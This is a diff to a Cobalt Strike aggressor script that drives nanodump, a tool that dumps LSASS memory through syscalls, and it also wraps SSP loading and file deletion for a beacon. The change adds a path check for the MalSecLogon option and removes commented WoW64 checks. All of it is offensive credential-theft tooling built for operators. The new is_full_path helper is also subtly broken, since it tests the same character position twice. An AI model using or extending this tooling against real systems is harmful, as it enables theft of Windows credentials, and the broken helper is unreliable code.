@@ -14,6 +14,27 @@ local('@dictionary $string $min_length $max_length $length');
     return $string;
 }
 
+sub is_full_path {
+local('$string $c');
+    $string = lc($1);
+    $c = substr($string, 0, 1);
+    if (asc($c) < 97 || asc($c) > 122)
+    {
+        return false;
+    }
+    $c = substr($string, 1, 2);
+    if ($c != ':')
+    {
+        return false;
+    }
+    $c = substr($string, 1, 2);
+    if ($c != '\\')
+    {
+        return false;
+    }
+    return true;
+}
+
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
@@ -27,15 +48,6 @@ alias nanodump {
         berror($1, "Nanodump does not support x86");
         return;
     }
-
-    ## make sure the beacon is not WoW64
-    #$barch = barch($1);
-    #$is64 = binfo($1, "is64");
-    #if($barch eq "x86" && $is64 == 1)
-    #{
-    #    berror($1, "Nanodump does not support WoW64");
-    #    return;
-    #}
 
     # reading lsass requires elevated privileges
     if(!-isadmin $1)
@@ -169,6 +181,12 @@ alias nanodump {
         return;
     }
 
+    if($use_malseclogon && !$dup && !is_full_path($dump_path))
+    {
+        berror($1, "If MalSecLogon is being used locally, you need to provide the full path: ". $dump_path);
+        return;
+    }
+
     if($use_malseclogon && $dup == 0 && $write_file == 0)
     {
         berror($1, "The option --malseclogon requires a dump path with --write unless --dup is also provided");
@@ -214,15 +232,6 @@ alias load_ssp {
         berror($1, "Nanodump does not support x86");
         return;
     }
-
-    ## make sure the beacon is not WoW64
-    #$barch = barch($1);
-    #$is64 = binfo($1, "is64");
-    #if($barch eq "x86" && $is64 == 1)
-    #{
-    #    berror($1, "Nanodump does not support WoW64");
-    #    return;
-    #}
 
     # loading an SSP requires elevated privileges
     if(!-isadmin $1)
@@ -289,7 +298,6 @@ alias delete_file {
         berror($1, "delete_file does not support WoW64, use: rm");
         return;
     }
-
 
     # read in the BOF file
     $handle = openf(script_resource("compiled/delete_file." . $barch . ".o"));
